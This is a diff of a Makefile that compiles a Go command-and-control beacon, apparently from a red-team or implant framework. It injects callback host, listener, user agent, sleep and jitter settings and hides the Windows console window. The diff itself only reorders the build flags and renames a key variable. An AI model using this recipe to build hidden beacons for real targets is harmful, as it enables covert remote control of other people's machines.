@@ -16,11 +16,11 @@ cGOARCH=amd64
 KEY=key
 
 gohttp: 
-	set GOOS=${cGOOS} 
-	set GOARCH=${cGOARCH} 
+# set GOOS=${cGOOS} 
+# set GOARCH=${cGOARCH} 
 	
 
 # GOOS=${cGOOS} GOARCH=${cGOARCH} (put this infront of go build)
-	go build \
-	-ldflags "-X 'main.sSLEEP=${sSLEEP}' -X 'main.BEACON_NAME=${BEACON_NAME}' -X 'main.KEY=${KEY}' -X 'main.sJITTER=${sJITTER}' -X 'main.RHOST=${RHOST}' -X 'main.LISTENER_NAME=${LISTENER_NAME}' -X 'main.USERAGENT=${USERAGENT}' -X 'main.URI=${URI}' -H windowsgui" \
+	GOOS=${cGOOS} GOARCH=${cGOARCH} go build \
+	-ldflags "-X 'main.sSLEEP=${sSLEEP}' -X 'main.BEACON_NAME=${BEACON_NAME}' -X 'main.sKEY=${KEY}' -X 'main.sJITTER=${sJITTER}' -X 'main.RHOST=${RHOST}' -X 'main.LISTENER_NAME=${LISTENER_NAME}' -X 'main.USERAGENT=${USERAGENT}' -X 'main.URI=${URI}' -H windowsgui" \
 	-o ${SPAWN_PATH}${BINARY_NAME}
